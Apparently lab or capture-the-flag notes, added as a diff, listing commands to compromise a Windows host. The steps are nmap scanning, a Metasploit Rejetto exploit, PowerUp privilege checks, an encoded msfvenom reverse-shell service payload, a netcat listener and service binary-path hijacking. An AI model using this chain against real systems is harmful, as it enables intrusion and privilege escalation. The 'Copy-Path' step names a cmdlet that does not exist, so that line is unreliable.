@@ -1,0 +1,53 @@
+#Reconnaissance
+sudo nmap -sS -sV -Pn <IP>
+
+#Opening msfconsole
+msfconsole -q
+
+#Searching for rejetto exploit
+search rejetto
+
+#Description of MSF module
+info <module id>
+
+#Cat alternative for Windows. this would print the content of a file on the console.
+type <file_name>
+
+#Upload PowerUp.ps1 script. Execute below code from meterpreter shell
+upload PowerUp.ps1
+
+#Load powershell plugin in meterpreter
+load powershell
+
+#Start interactive powershell in the meterpreter
+powershell_shell
+
+#Execute PowerUp.ps1 script inside the powershell.
+. ./PowerUp.ps1
+
+#Invoke-AllChecks execution in the powershell
+Invoke-AllChecks
+
+#Create malicious Windows payload
+msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o <payload_name>.exe
+
+#Upload malicious windows payload
+upload <payload_name>.exe
+
+#Stop service
+sc stop <service_name>
+
+#Update service binPath from powershell
+Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path “Hijacked Path”
+
+#Starting netcat listener
+nc -lvnp <port_no>
+
+#Start service
+sc start <service_name>
+
+#Alternative way to update service path from Powershell
+Copy-Path <path of maliicios exe> -Destination "<path of the service>" -Force
+
+#Helper command for knowing the information about a service
+sc qc <service_name>
